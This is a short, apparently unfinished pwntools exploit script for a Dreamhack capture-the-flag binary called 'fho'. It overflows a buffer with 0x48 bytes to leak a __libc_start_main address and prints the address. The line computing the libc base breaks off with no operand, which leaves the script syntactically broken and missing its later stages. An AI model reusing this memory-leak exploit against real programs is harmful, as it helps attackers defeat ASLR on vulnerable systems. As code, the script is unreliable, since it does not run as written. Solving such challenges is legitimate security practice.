from pwn import *

#p = remote('host3.dreamhack.games', '14038')
p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

# libc leak
buf = b"A"*0x48
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
libc_start_main = u64(p.recvline()[:-1] + b'\x00'*2)
print(hex(libc_start_main))

libc_base = libc_start_main - 

p.interactive()


# libc6_2.27-3ubuntu1.4_amd64
# https://wyv3rn.tistory.com/60
